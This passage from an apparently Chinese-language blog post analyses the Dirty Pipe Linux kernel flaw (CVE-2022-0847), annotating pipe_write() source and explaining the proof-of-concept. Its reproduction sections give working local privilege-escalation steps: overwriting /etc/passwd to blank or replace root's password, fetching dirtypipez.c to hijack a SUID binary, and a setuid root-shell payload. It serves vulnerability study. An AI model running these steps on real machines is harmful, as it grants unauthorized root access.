class="hljs-number">1</span>;<br>        <span class="hljs-comment">///注意这里获取pipe_buffer的操作，也是被其他人遗漏掉的一点</span><br>        <span class="hljs-comment">//head - 1。因为head-1，才能得到前一个pipe_buf的page，进而完成续写。</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">buf</span> =</span> &amp;pipe-&gt;bufs[(head - <span class="hljs-number">1</span>) &amp; mask];<span class="hljs-comment">//获取 pipe 头部的缓冲区。</span><br><br><span class="hljs-keyword">int</span> offset = buf-&gt;offset + buf-&gt;len;<br>        <span class="hljs-comment">//[2]核心关键</span><br>        <span class="hljs-comment">//判断当前页面是否带有PIPE_BUF_FLAG_CAN_MERGE的flag，且前写入的数据拼接在之前的数据后面长度不超过一页(即写入操作不跨页)，如果都满足，则将 chars 长度的数据写入到当前的缓冲区中</span><br><span class="hljs-keyword">if</span> ((buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE) &amp;&amp;<br>    offset + chars &lt;= PAGE_SIZE) &#123;<br>ret = <span class="hljs-built_in">pipe_buf_confirm</span>(pipe, buf);<br><span class="hljs-keyword">if</span> (ret)<br><span class="hljs-keyword">goto</span> out;<br><br>ret = <span class="hljs-built_in">copy_page_from_iter</span>(buf-&gt;page, offset, chars, from);<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">unlikely</span>(ret &lt; chars)) &#123;<br>ret = -EFAULT;<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br><br>buf-&gt;len += ret;<br>            <span class="hljs-comment">//如果剩余要写入的数据大小为零，则直接返回。</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">iov_iter_count</span>(from))<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br>&#125;<br>    <span class="hljs-comment">//[3]如果无法在上一页续写，则另起一页</span><br><span class="hljs-keyword">for</span> (;;) &#123;<br>        <span class="hljs-comment">//判断 pipe 的读者数量是否为零。</span><br><span class="hljs-keyword">if</span> (!pipe-&gt;readers) &#123;<br><span class="hljs-built_in">send_sig</span>(SIGPIPE, current, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (!ret)<br>ret = -EPIPE;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br>head = pipe-&gt;head;<br>        <span class="hljs-comment">//pipe缓冲区未满</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">pipe_full</span>(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;<br>            <span class="hljs-comment">// 获取pipe的缓冲区及pipe的临时页tmp_page，后续用于pipe_buf的初始化</span><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> mask = pipe-&gt;ring_size - <span class="hljs-number">1</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">buf</span> =</span> &amp;pipe-&gt;bufs[head &amp; mask];<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span> =</span> pipe-&gt;tmp_page;<br><span class="hljs-keyword">int</span> copied;<br>            <span class="hljs-comment">//[4]判断该tem_page是否已经分配，如果没有则alloc_page申请一个新的page</span><br><span class="hljs-keyword">if</span> (!page) &#123;<br>page = <span class="hljs-built_in">alloc_page</span>(GFP_HIGHUSER | __GFP_ACCOUNT);<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">unlikely</span>(!page)) &#123;<br>ret = ret ? : -ENOMEM;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>pipe-&gt;tmp_page = page;<br>&#125;<br><br>            <span class="hljs-comment">//使用自旋锁锁住pipe的读者等待队列。再次检测pipe是否被填满，是则终止当前循环，执行下一次循环。</span><br><span class="hljs-built_in">spin_lock_irq</span>(&amp;pipe-&gt;rd_wait.lock);<br><br>head = pipe-&gt;head;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">pipe_full</span>(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;<br><span class="hljs-built_in">spin_unlock_irq</span>(&amp;pipe-&gt;rd_wait.lock);<br><span class="hljs-keyword">continue</span>;<br>&#125;<br>      <span class="hljs-comment">//将struct pipe_inode_info实例的head字段值增加1。并释放自旋锁。</span><br>pipe-&gt;head = head + <span class="hljs-number">1</span>;<br><span class="hljs-built_in">spin_unlock_irq</span>(&amp;pipe-&gt;rd_wait.lock);<br><br>      <span class="hljs-comment">//[5]将新的页放在数组最前面(可能会替换掉原有页面)，初始化页管理结构的相关成员。</span><br>buf = &amp;pipe-&gt;bufs[head &amp; mask];<br>buf-&gt;page = page;<br>buf-&gt;ops = &amp;anon_pipe_buf_ops;<br>buf-&gt;offset = <span class="hljs-number">0</span>;<br>buf-&gt;len = <span class="hljs-number">0</span>;<br>            <br>       <span class="hljs-comment">//如果创建pipe时指定了O_DIRECT选项，则将缓冲区的flags字段设置为PIPE_BUF_FLAG_PACKET，否则设置为PIPE_BUF_FLAG_CAN_MERGE。</span><br>       <span class="hljs-comment">//文件操作O_DIRECT使用：https://www.jianshu.com/p/7c891a002a4e</span><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">is_packetized</span>(filp))<br>buf-&gt;flags = PIPE_BUF_FLAG_PACKET;<br><span class="hljs-keyword">else</span><br>buf-&gt;flags = PIPE_BUF_FLAG_CAN_MERGE;<br>pipe-&gt;tmp_page = <span class="hljs-literal">NULL</span>;<br>      <span class="hljs-comment">//将数据拷贝到新分配的page中</span><br>copied = <span class="hljs-built_in">copy_page_from_iter</span>(page, <span class="hljs-number">0</span>, PAGE_SIZE, from);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">unlikely</span>(copied &lt; PAGE_SIZE &amp;&amp; <span class="hljs-built_in">iov_iter_count</span>(from))) &#123;<br><span class="hljs-keyword">if</span> (!ret)<br>ret = -EFAULT;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>      <span class="hljs-comment">//设置相应的偏移量字段。</span><br>ret += copied;<br>buf-&gt;offset = <span class="hljs-number">0</span>;<br>buf-&gt;len = copied;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">iov_iter_count</span>(from))<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br>…… ……<br>&#125;<br><br><span class="hljs-comment">//[https://github.com/torvalds/linux/blob/v5.8/fs/pipe.c#L403](https://github.com/torvalds/linux/blob/v5.8/fs/pipe.c#L403)</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-keyword">int</span> <span class="hljs-title">is_packetized</span><span class="hljs-params">(struct file *file)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">return</span> (file-&gt;f_flags &amp; O_DIRECT) != <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//https://github.com/torvalds/linux/blob/1c52283265a462a100ae63ddf58b4e5884acde86/include/linux/pipe_fs_i.h#L132</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-keyword">bool</span> <span class="hljs-title">pipe_empty</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> head, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> tail)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">return</span> head == tail;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="POC视角：splice-和write"><a href="#POC视角：splice-和write" class="headerlink" title="POC视角：splice()和write()"></a>POC视角：splice()和write()</h2><p>作者早期概念性POC：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span> </span>&#123;<br>  <span class="hljs-keyword">for</span> (;;) <span class="hljs-built_in">write</span>(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;AAAAA&quot;</span>, <span class="hljs-number">5</span>);<br>&#125;<br><span class="hljs-comment">// ./writer &gt;foo</span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span> </span>&#123;<br>  <span class="hljs-keyword">for</span> (;;) &#123;<br>    <span class="hljs-built_in">splice</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">write</span>(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;BBBBB&quot;</span>, <span class="hljs-number">5</span>);<br>  &#125;<br>&#125;<br><span class="hljs-comment">// ./splicer &lt;foo |cat &gt;/dev/null</span><br></code></pre></td></tr></table></figure><p>仅使用了<code>splice()</code>和<code>write()</code> 函数，那么为什么仅需要这两个函数就可以达成效果？</p><ol><li><code>splice()</code>利用底层的零拷贝机制，调用<code>copy_page_to_iter_pipe()</code>完成pipe_buf的页和目标文件page_cache的绑定，且在<code>copy_page_to_iter_pipe()</code>中未初始化页面的<code>PIPE_BUF_FLAG_CAN_MERGE</code>属性</li><li><code>write()</code> 写入脏数据的时候调用<code>pipe_write()</code>，<code>pipe_write()</code>对带<code>PIPE_BUF_FLAG_CAN_MERGE</code>标签的<code>pipe_buf</code>写时，错误的判定write操作可合并(merge)，进而获取指向待写入文件界面缓存的pipe_buf的指针，且这里向管道写时不存在权限检查，最后导致了非法数据写入文件页面缓存, 实现了任意文件覆盖漏洞。<ol><li>如果没有<code>PIPE_BUF_FLAG_CAN_MERGE</code>标签的话，实际上会往<code>pipe-&gt;tmp_page</code>去写，此时就不会写到目标文件中。</li></ol></li></ol><p><img src="https://github.com/corp0ra1/BlogPhoto/tree/master/newBlogPhoto/The%20Dirty%20Pipe%20Vulnerability/Untitled%2019.png"></p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="docker安装（失败）"><a href="#docker安装（失败）" class="headerlink" title="docker安装（失败）"></a>docker安装（失败）</h3><ol><li>拉取镜像：docker pull ubuntu</li><li>启动容器：docker run -it  ubuntu /bin/bash。此为ubuntu20.04版本，内核Linux 3.10.0</li><li>安装基本命令：<ol><li>由于docker pul下来的为极简版的ubuntu，很多命令都没有，包括vi等</li><li>如果直接apt-get update的话，源不对，则很慢，于是考虑换源</li><li>在vi等命令没有的情况下，可以使用<strong>cat &gt;xxx.file &lt;EOF</strong>的操作换源，源地址：<a href="https://zhuanlan.zhihu.com/p/142014944">Ubuntu20.04软件源更换</a><br> <img src="https://github.com/corp0ra1/BlogPhoto/tree/master/newBlogPhoto/The%20Dirty%20Pipe%20Vulnerability/Untitled%208.png">      </li><li>换源后执行：apt-get update</li><li>安装基本命令：git，python3，python3-pip</li></ol></li><li>使用metarget搭建漏洞环境<ol><li>git clone <a href="https://github.com/brant-ruan/metarget.git">https://github.com/brant-ruan/metarget.git</a></li><li>cd metarget/</li><li>pip install -r requirements.txt</li><li>./metarget cnv install cve-2022-0847 –verbose<ol><li>报错six模块缺失：pip3 install six</li><li>报错<a href="https://www.codegrepper.com/code-examples/shell/%2Fusr%2Fbin%2Fadd-apt-repository%3A+No+such+file+or+directory">“/usr/bin/add-apt-repository: No such file or directory” **</a>：**apt-get install software-properties-common ，选6·Asia，和70·shanghai</li></ol></li><li>但是怎么解决报错，最终都安装环境失败</li></ol></li><li>原因：<a href="https://stackoverflow.com/questions/66413051/docker-linux-container-kernel-update">docker和宿主机共用同一个系统内核</a>（是我蠢了忘了这茬）<blockquote><p>You cannot upgrade kernel <em>inside docker container</em>- the whole point of using Docker containers in contrary to virtualization is that you use the same kernel that your underlying OS does. You have to upgrade your operating system kernel to fix this problem.</p></blockquote></li></ol><h3 id="虚拟机安装"><a href="#虚拟机安装" class="headerlink" title="虚拟机安装"></a>虚拟机安装</h3><ol><li>ubuntu18.04安装—失败<ol><li>使用metarget搭建漏洞环境，重启之后出现”SMBus Host Controller not enabled”无法开机，尝试多种方案，但无果，放弃<ol><li>虽然可以使用tty2进入命令行执行命令，但是不能复制粘贴，手敲命令很烦+觉得不是完美换内核方案，就算了</li></ol></li><li>手动升级内核：内核升级教程参考：<a href="https://zhuanlan.zhihu.com/p/75669680">记一次Ubuntu 18.04 内核升级 - 知乎 (zhihu.com)</a>。 但依然出现了上述错误，即使更换了另外一个内核版本依然出现上述问题，无果，放弃</li></ol></li><li>kali上安装—成功<ol><li>使用metarget搭建漏洞环境，重启之后出现”SMBus Host Controller not enabled”，但是并没有在这里卡主，等一会即可登录，成功！</li></ol></li></ol><h2 id="作者POC的原理"><a href="#作者POC的原理" class="headerlink" title="作者POC的原理"></a>作者POC的原理</h2><ol><li>首先创建一个 pipe。接着每次向 pipe 中写入一个页帧大小的数据。理由：从 <code>pipe_write()</code> 可知，每次写入都不会进入 <code>if (chars &amp;&amp; !was_empty)</code> 这个分支，因为写入数据的大小为页帧大小的整数倍时，<code>chars</code> 的值总为零。创建 pipe 的时候没有指定 <code>O_DIRECT</code> 标志，因此在 for 循环中会将每个 <code>pipe_buffer</code> 的标志位设置为 <code>PIPE_BUF_FLAG_CAN_MERGE</code>。</li><li>接下来打开要覆写的文件，并通过 <code>splice()</code> 系统调用向 pipe 中写入一个字节。根据 <code>splice()</code> 的实现，将待覆盖的文件从硬盘读取到 <code>page cache</code> 后，会把文件对应的<code>page cache</code>与 <code>pipe_buffer</code> 的 <code>page</code> 字段关联起来，并且不会重置 <code>pipe_buffer</code> 的 <code>flags</code> 字段。也就是说，此时 <code>flags</code> 字段的值仍为 <code>PIPE_BUF_FLAG_CAN_MERGE</code>。</li><li>最后<code>write()</code>调用 <code>pipe_write()</code> 之后<ol><li>由于写入小于一个页帧大小的数据，会进入 <code>if (chars &amp;&amp; !was_empty)</code> 分支。为了将小于一个页帧的数据写入到前一个 <code>pipe_buffer</code> 中， 此分支获取 <code>pipe_buffer</code> 的时候将 <code>head</code> 值减 1，从而此时 <code>pipe_buffer</code> 的指针指向的是待写入文件的 page cache。</li><li>再由于该<code>pipe_buffer</code> 设置了<code>PIPE_BUF_FLAG_CAN_MERGE</code>标志，会进入<code>if ((buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE) &amp;&amp;offset + chars &lt;= PAGE_SIZE)</code>分支，进而调用<code>copy_page_to_iter_pipe()</code> 完成脏数据写入</li></ol></li></ol><h2 id="使用作者的POC改-etc-passwd"><a href="#使用作者的POC改-etc-passwd" class="headerlink" title="使用作者的POC改/etc/passwd"></a>使用作者的POC改/etc/passwd</h2><h3 id="etc-passwd概念"><a href="#etc-passwd概念" class="headerlink" title="/etc/passwd概念"></a>/etc/passwd概念</h3><ol><li>背景：历史上Linux的前身，一些基于Unix的系统，是没有shadow这个文件的，用户密码的哈希就保存在/etc/passwd的第二个字段。但是/etc/passwd是全局可读的文件，用户的哈希可能被其他用户所读取。</li><li>解决方案：衍生出了/etc/shadow文件。在此之后/etc/passwd的第二列通常设置为x，表示用户密码保存在/etc/shadow中，而/etc/shadow文件只有root用户可以读取和写入，这样就保护了密码哈希不能被第三方爆破。</li><li>关于passwd文件各个字段的<a href="https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/">解释</a><br> <img src="https://github.com/corp0ra1/BlogPhoto/tree/master/newBlogPhoto/The%20Dirty%20Pipe%20Vulnerability/Untitled%209.png"><ol><li><strong>Username用户名</strong>: 当用户登录时使用。它的长度应该在1到32个字符之间。</li><li><strong>Password</strong>:密码 x字符表示加密密码存储在/etc/shadow文件中。请注意，您需要使用passwd命令来计算在CLI中键入的密码的哈希值，或者在/etc/shadow文件中存储/更新密码的哈希值。为空则表示无密码</li><li><strong>User ID (UID)用户标识号</strong>: 必须为每个用户分配一个用户ID（UID）。0为root用户保留，UID1-99为其他预定义帐户保留。系统为管理和系统帐户/组保留了更多UID 100-999。</li><li><strong>Group ID (GID)组标识</strong>: 主组ID（存储在/etc/group文件中）</li><li><strong>User ID Info (GECOS)注释字段</strong>: 它允许添加有关用户的额外信息，例如用户的全名、电话号码等。此字段由finger命令使用。<ol><li>也就说这部分的字段可以任意删减无所谓</li></ol></li><li><strong>Home directory用户主目录</strong>: 用户登录时所处目录的绝对路径。如果此目录不存在，则用户目录变为/</li><li><strong>Command/shell命令解释程序</strong>: 命令或shell的绝对路径。通常是一个shell。但他也不一定是shell。例如，系统管理员可以使用nologin shell充当用户帐户的shell。此时如果shell设置为/sbin/nologin，并且用户试图直接登录Linux系统，/sbin/nologin shell将关闭登录连接。<ol><li>感觉本质上就是登录后首先执行的一段程序？比如nologin执行之后，则不返回shell，而是报错显示连接不上</li></ol></li></ol></li></ol><h3 id="方法一：P牛的手动"><a href="#方法一：P牛的手动" class="headerlink" title="方法一：P牛的手动"></a>方法一：P牛的手动</h3><p>代码：<code>./exp /etc/passwd 1 &quot;oot::0:0:rootx&quot;</code></p><p>原理：设置root的密码为空</p><p><img src="https://github.com/corp0ra1/BlogPhoto/tree/master/newBlogPhoto/The%20Dirty%20Pipe%20Vulnerability/Untitled%2010.png"></p><h3 id="方法二：写个脚本自动化替换上述过程"><a href="#方法二：写个脚本自动化替换上述过程" class="headerlink" title="方法二：写个脚本自动化替换上述过程"></a>方法二：写个脚本自动化替换上述过程</h3><ol><li>解决方案：<a href="https://github.com/imfiver">imfiver</a>/<strong><a href="https://github.com/imfiver/CVE-2022-0847">CVE-2022-0847</a></strong></li><li>原理：把上述gcc编译以及手动执行过程全部写死了。</li><li>核心code<ol><li><code>passwd_tmp=$(cat /etc/passwd|head)</code> ：head默认值展示前10行。此时<code>passwd_tmp</code>变量为passwd文件中前10行的值</li><li><code>$&#123;passwd_tmp/root:x/oot:&#125;</code>：其语法规则为<code>$&#123;变量/查找/替换值&#125;</code>  。即替换<code>passwd_tmp</code>中的<code>root:x</code>为<code>oot:</code> （<code>splice</code>调用时默认已经读了passwd里面第一个字符<code>r</code>） <img src="https://github.com/corp0ra1/BlogPhoto/tree/master/newBlogPhoto/The%20Dirty%20Pipe%20Vulnerability/Untitled%2011.png"></li></ol> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp">cp /etc/passwd /tmp/passwd <span class="hljs-comment">//备份passwd文件</span><br>gcc exp.c -o exp -std=c99  <span class="hljs-comment">//编译exp</span><br>passwd_tmp=$(cat /etc/passwd|head)<br>./exp /etc/passwd <span class="hljs-number">1</span> <span class="hljs-string">&quot;$&#123;passwd_tmp/root:x/oot:&#125;&quot;</span>  <span class="hljs-comment">//执行exp</span><br></code></pre></td></tr></table></figure></li><li>复现： <img src="https://github.com/corp0ra1/BlogPhoto/tree/master/newBlogPhoto/The%20Dirty%20Pipe%20Vulnerability/Untitled%2012.png"></li><li>缺点：其使用的替换passwd文件的方法并不完美<ol><li>描述：<code>root:x</code> 为六个字符，而<code>oot:</code> 为4个，即使加上<code>splice</code>所读取的<code>r</code> 。替换后依然少了一个字符</li><li>现象：覆盖不完整，后续存在某个地方多一个字符。如图，其中news这个用户刚刚好是第十行，然后其shell地址就多了一个n。</li><li>后果：此时news用户登陆不上(虽然也没什么用)</li></ol></li><li>改进：使用P牛的方法，利用User ID Info (GECOS)注释字段，将注释字段的root改成rootx即可确保字符长度一致性，不会对后续内容进行影响<ol><li>可以看到前面P牛方法的图中diff内容，内容更加简洁有效。</li></ol></li></ol><p><img src="https://github.com/corp0ra1/BlogPhoto/tree/master/newBlogPhoto/The%20Dirty%20Pipe%20Vulnerability/Untitled%2013.png"></p><h3 id="方法三：改root密码"><a href="#方法三：改root密码" class="headerlink" title="方法三：改root密码"></a>方法三：改root密码</h3><ol><li>背景：之前的方案都是将密码去除，那么能否改密码呢？</li><li>解决方案：<a href="https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit">Arinerron/CVE-2022-0847-DirtyPipe-Exploit</a> ，在passwd字段替换的内容改为相应的密码hash</li><li>技术背景：<ol><li>加密的密码具有固定格式：<code>$id$salt$encrypted</code> ：id表示加密算法，1代表<code>MD5</code>，5代表<code>SHA-256</code>，6代表<code>SHA-512</code> salt表示密码学中的Salt,系统随机生成 encrypted表示密码的hash。</li><li>生成加密密码的方法：<code>openssl passwd -1 -salt nosalt corp0ra1</code>.其中salt参数未指定则随机生成一个salt</li></ol></li><li>改进方向<ol><li>其使用的是<code>/bin/sh</code>作为shell解释程序，其实也可以改为<code>/bin/bash</code>这种（emm）</li><li>改为自己的密码hash，如：<code>openssl passwd -1  corp0ra1</code> ，产生秘钥为<code>$1$ZpSBXa3N$LGLE2TKYoc2GVFFP3.jC80</code></li></ol></li><li>疑问：/etc/passwd文件的第二行就乱了啊，这种乱的东西系统读的时候不会产生bug吗？？<ol><li>搜了半天，暂时没搜到相关资料。</li><li>但是既不影响root的登录，也不影响后续账户的登录，留个坑吧</li></ol></li></ol><p><img src="https://github.com/corp0ra1/BlogPhoto/tree/master/newBlogPhoto/The%20Dirty%20Pipe%20Vulnerability/Untitled%2014.png"></p><h2 id="dirtypipez-c"><a href="#dirtypipez-c" class="headerlink" title="dirtypipez.c"></a><a href="https://haxx.in/files/dirtypipez.c">dirtypipez.c</a></h2><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp">mkdir dirtypipez<br>cd dirtypipez<br>wget https:<span class="hljs-comment">//haxx.in/files/dirtypipez.c</span><br>gcc dirtypipez.c -o dirtypipez<br><span class="hljs-comment">//先找到一个具有 SUID 权限的可执行文件</span><br>find / -perm -u=s -type f <span class="hljs-number">2</span>&gt;/dev/null<br><span class="hljs-comment">//执行其中任意一个具有 SUID 权限的文件，如/bin/su</span><br>./dirtypipez /usr/bin/su<br></code></pre></td></tr></table></figure><p><img src="https://github.com/corp0ra1/BlogPhoto/tree/master/newBlogPhoto/The%20Dirty%20Pipe%20Vulnerability/Untitled%2015.png"></p><h3 id="原理探索"><a href="#原理探索" class="headerlink" title="原理探索"></a>原理探索</h3><blockquote><p>此次接触这类提权方式，故深入探索</p></blockquote><p>操作：直接修改一个具有suid权限的可执行文件，然后执行这个可执行文件提权，完成提权后再把文件改回来</p><ol><li>hijacking suid binary：将恶意代码写入具备root权限的SUID程序</li><li>dropping suid shell：执行被篡改后的程序<ol><li>运行此程序时可获取root 权限:以root的身份将提权代码写入/tmp/sh，并设置其可执行权限为<code>4755</code> <img src="https://github.com/corp0ra1/BlogPhoto/tree/master/newBlogPhoto/The%20Dirty%20Pipe%20Vulnerability/Untitled%2016.png"></li></ol> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><br>fd = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/tmp/sh&quot;</span>, O_WRONLY | O_CREAT | O_TRUNC);<br><span class="hljs-built_in">write</span>(fd, elfcode, elfcode_len)<br><span class="hljs-built_in">chmod</span>(<span class="hljs-string">&quot;/tmp/sh&quot;</span>, <span class="hljs-number">04755</span>)<br><span class="hljs-built_in">close</span>(fd);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure></li><li>restoring suid binary：恢复被篡改文件为原样</li><li>popping root shell ：获取shell<ol><li>执行/tmp/sh文件 ，具有<code>4755</code>权限的/tmp/sh执行效果可参考：<a href="https://blog.csdn.net/Shad0wpf/article/details/103488853">Linux下普通用户使用强制位获取root权限</a></li></ol> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp">/tmp/sh文件内容：<br><span class="hljs-built_in">setuid</span>(<span class="hljs-number">0</span>);<br><span class="hljs-built_in">setgid</span>(<span class="hljs-number">0</span>);<br><span class="hljs-built_in">execve</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>, [<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-literal">NULL</span>], [<span class="hljs-literal">NULL</span>]);<br></code></pre></td></tr></table></figure></li></ol><p>补充：</p><ol><li>为什么要找具备root权限的SUID程序：SUID可以让程序调用者以文件拥有者的身份运行该文件，当我们以一个普通用户去运行一个root用户所有的SUID文件，那么运行该文件我们就可以获取到root权限，虽然SUID权限只在该程序执行过程中有效。</li><li>如何寻找具备root权限的SUID程序：如<code>find / -perm -u=s -type f 2&gt;/dev/null</code>(不同系统适用于不同的命令)</li></ol><h3 id="shellcode探索"><a href="#shellcode探索" class="headerlink" title="shellcode探索"></a>shellcode探索</h3><blockquote><p>其实作者备注给了shellcode，但是之前一直只是用别人的shellcode，或者自动化生成shellcode，其实并不能看懂shellcode，以及背后hex编码的含义，借此机会初步探一探而已。本质上是废话内容</p></blockquote><p><img src="https://github.com/corp0ra1/BlogPhoto/tree/master/newBlogPhoto/The%20Dirty%20Pipe%20Vulnerability/Untitled%2017.png"></p><h1 id="补充内容"><a href="#补充内容" class="headerlink" title="补充内容"></a>补充内容</h1><h2 id="作者文章提及的POC限制"><a href="#作者文章提及的POC限制" class="headerlink" title="作者文章提及的POC限制"></a>作者文章提及的POC限制</h2><ol><li>为什么要读的权限？因为要调用<code>splice()</code>，而<code>splice()</code>需要读的权限</li><li>为什么必须读一个字节？因为要使用<code>splice()</code>读入一个byte到pipe中 ，进而完成文件对应的 page与 <code>pipe_buffer</code> 的 <code>page</code> 字段的关联</li><li>为什么写的空间不能超过page限制？因为有判断<code>offset + chars &lt;= PAGE_SIZE</code>，超过则不让续写，会往<code>pipe-&gt;tmp_page</code>去写，就不会写到目标文件中。</li><li>为什么文件不能被改写大小？<ol><li>作者的解释：因为管道有自己的页面填充管理，不会告诉页面缓存追加了多少数据</li><li>我的理解：文件有自己的一套管理系统，记录自己的文件大小。而此处只是对缓存界面中改写</li><li>ghost461@知道创宇404实验室<strong>：*①</strong>做的实验提及：poc_p2写入的是tmpFile文件的页面缓存, 所以无限的循环会因文件到尾而写入失败, 跳出循环。②由于需要写入的页面都是内核通过文件IO读取的page cache, 所以任意写入文件只能是单纯的“覆写”, 不能调整文件的大小*</li></ol></li></ol><h2 id="作者POC的一些问题"><a href="#作者POC的一些问题" class="headerlink" title="作者POC的一些问题"></a>作者POC的一些问题</h2><ol><li>作者的POC为什么要写完所有的buffer？<ol><li>写完的目的是确保每个pipe的flag都设置了，确保splice绑定的pipe_buf的flag都设置了，不然存在一定的偶然性，即flag没设置好，进而导致后续续写失败</li></ol></li><li>作者POC为什么写一个页帧的大小？从 <code>pipe_write()</code> 函数可知，如果写入数据的大小为页帧大小的整数倍时，<code>chars</code> 的值总为零，此时写入不会进入 <code>if (chars &amp;&amp; !was_empty)</code> 这个分支。同时创建 pipe 的时候没有指定 <code>O_DIRECT</code> 标志，因此在 for 循环中会将每个 <code>pipe_buffer</code> 的标志位设置为 <code>PIPE_BUF_FLAG_CAN_MERGE</code>。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/* fill the pipe completely; each pipe_buffer will now have  the PIPE_BUF_FLAG_CAN_MERGE flag */</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">unsigned</span> r = pipe_size; r &gt; <span class="hljs-number">0</span>;) &#123;<br><span class="hljs-keyword">unsigned</span> n = r &gt; <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(buffer) ? <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(buffer) : r;<br><span class="hljs-built_in">write</span>(p[<span class="hljs-number">1</span>], buffer, n);<br>r -= n;<br>&#125;<br></code></pre></td></tr></table></figure></li><li>为什么作者POC要排干所有的pipe_buffer？<ol><li>能不能不排空？不行，因为进行merge之前有个判断if (chars &amp;&amp; !was_empty) ，而was_empty = pipe_empty(head, pipe-&gt;tail);，如果pipe满的话，则无法merge</li><li>能不能只排空一个？不行。因为之前<code>splice</code>函数调用<code>copy_page_to_iter_pipe</code>函数读入一个字节之后就占用了一个pipe_buffer，此时还是pipe_buffer满的。</li><li>能不能只排空两个？理论上应该可以？emmm没有深究了<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/* drain the pipe, freeing all pipe_buffer instances (but leaving the flags initialized) */</span><br><span class="hljs-keyword">for</span> (<span 